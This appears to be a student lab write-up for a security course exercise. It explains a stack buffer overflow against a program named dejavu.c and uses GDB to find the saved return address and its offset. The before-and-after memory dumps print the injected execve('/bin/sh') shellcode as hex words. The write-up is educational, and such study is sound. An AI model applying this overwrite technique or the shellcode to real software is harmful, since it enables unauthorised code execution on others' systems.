Vulnerability: The basic idea of buffer overflow is to stuff more data into a buffer than it can handle,
thus allowing you to overwrite things such as the RIP.

How it can be exploited: By feeding more data into the buffer than it can handle, we can overwrite
the RIP to point it to the location where we have stored our shellcode, causing the program to execute
this instead of its original instruction. 

How we determined which address to jump to: We used info frame in GDB to find the location of the RIP, and
x/32x to determine the offset from the beginning of the buffer to the RIP. The address of the shellcode was
determined by where we chose to insert it (immediately after the RIP) when we wrote our egg script.

Sketch of Solution: After deteriming the address of the RIP and the offset to it from the beginning of the 
buffer, we overwrote the value of the RIP with the location of the shellcode, such that the shellcode was
executed instead of the original instruction pointed to by the RIP.

GDB Output:
Before:
(gdb) info frame
 Stack level 0, frame at 0xbffffe00:
  eip = 0x8048412 in deja_vu (dejavu.c:7); saved eip 0x804842a
  called by frame at 0xbffffe10
  source language c.
  Arglist at 0xbffffdf8, args:
  Locals at 0xbffffdf8, Previous frame's sp is 0xbffffe00
  Saved registers:
   ebp at 0xbffffdf8, eip at 0xbffffdfc
(gdb) x/32x &door
0xbffffde8:     0xbffffeac      0xb7e5f225      0xb7fed270      0x00000000
0xbffffdf8:     0xbffffe08      0x0804842a      0x08048440      0x00000000
0xbffffe08:     0x00000000      0xb7e454d3      0x00000001      0xbffffea4
0xbffffe18:     0xbffffeac      0xb7fdc858      0x00000000      0xbffffe1c
0xbffffe28:     0xbffffeac      0x00000000      0x0804821c      0xb7fd2000
0xbffffe38:     0x00000000      0x00000000      0x00000000      0xf09febf0
0xbffffe48:     0xc7caefe0      0x00000000      0x00000000      0x00000000
0xbffffe58:     0x00000001      0x08048320      0x00000000      0xb7ff26a0
After:
(gdb) info frame
 Stack level 0, frame at 0xbffffe00:
  eip = 0x804841d in deja_vu (dejavu.c:8); saved eip 0xbffffe00
  called by frame at 0xbffffe04
  source language c.
  Arglist at 0xbffffdf8, args:
  Locals at 0xbffffdf8, Previous frame's sp is 0xbffffe00
  Saved registers:
   ebp at 0xbffffdf8, eip at 0xbffffdfc
(gdb) x/32x &door
0xbffffde8:     0xbffffdfc      0xbffffdfc      0xbffffdfc      0xbffffdfc
0xbffffdf8:     0xbffffdfc      0xbffffe00      0x895e1feb      0xc0310876
0xbffffe08:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08
0xbffffe18:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff
0xbffffe28:     0x732f6e69      0x00000068      0x0804821c      0xb7fd2000
0xbffffe38:     0x00000000      0x00000000      0x00000000      0xf09febf0
0xbffffe48:     0xc7caefe0      0x00000000      0x00000000      0x00000000
0xbffffe58:     0x00000001      0x08048320      0x00000000      0xb7ff26a0